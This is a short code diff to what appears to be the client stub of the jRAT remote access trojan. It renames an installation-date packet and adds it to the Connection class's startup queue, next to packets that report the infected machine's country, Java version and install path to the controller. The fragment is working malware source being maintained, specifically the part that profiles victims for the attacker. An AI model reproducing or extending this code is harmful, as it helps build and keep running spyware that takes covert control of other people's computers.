@@ -32,7 +32,7 @@ import se.jrat.stub.packets.outgoing.Packet10InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
 import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
-import se.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
+import se.jrat.stub.packets.outgoing.Packet11InitInstallationDate;
 import se.jrat.stub.packets.outgoing.Packet36Initialized;
 import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
@@ -151,11 +151,11 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet8InitCountry());
 		addToSendQueue(new Packet9InitJavaVersion());
 		addToSendQueue(new Packet10InitInstallPath());
+		addToSendQueue(new Packet11InitInstallationDate());
 
 
 
 				
-		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
 
 
 
